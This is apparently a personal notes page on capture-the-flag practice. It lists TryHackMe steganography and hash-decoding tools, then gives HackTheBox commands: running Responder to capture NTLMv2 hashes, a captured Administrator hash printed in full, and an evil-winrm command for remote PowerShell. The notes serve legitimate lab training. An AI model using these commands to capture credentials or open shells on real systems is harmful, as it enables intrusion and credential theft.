# Overconfidence

--- https://tryhackme.com/room/c4ptur3th3fl4g (done)

* https://dencode.com/en/
* https://n0w4n.nl/
* https://github.com/s0md3v/Hash-Buster
* steg hide always ask for a password, can leave it blank
* strings to see the content of an image, wtf?
* Audacity/...
  * https://academo.org/demos/spectrum-analyzer/
  * https://hackedpatched.wordpress.com/
  * https://morsecode.world/international/decoder/audio-decoder-adaptive.html
  * apt install audacity (click on the file name->wav to spectrogram)
* https://www.tunnelsup.com/hash-analyzer/
* https://futureboy.us/stegano/
* https://xavag3djang0.github.io/
* https://0xnirvana.gitbook.io/writeups/
* https://robertmuwanga.netlify.app/
* https://niekdang.wordpress.com/

<hr class="sep-both">

## HackTheBox

* sudo responder -i IP -I tun1
* `//IP/anything` => RCI.

```
SMB] NTLMv2-SSP Client   : IP
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:08f7489440d62829:65FEF9C392D482D16F77D26BA2044BFB:01010000000000008008794AA3FED8018D41E5F3CE78121F0000000002000800460052003400390001001E00570049004E002D00540048004800580058004A003900410049004E00390004003400570049004E002D00540048004800580058004A003900410049004E0039002E0046005200340039002E004C004F00430041004C000300140046005200340039002E004C004F00430041004C000500140046005200340039002E004C004F00430041004C00070008008008794AA3FED801060004000200000008003000300000000000000001000000002000008888C18929A8C167C714CF514ADD1D611F4F3B9A6E05FC9D555755FDB84C7D900A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310037002E0035000000000000000000
```

* `5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)`
* `evil-winrm -i IP  -u username -p password` (remote powershell)
* https://github.com/Hackplayers/evil-winrm
* `-t 64` to domains
* `awscli` (https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html)
* Read all
* `pip3 install xxx`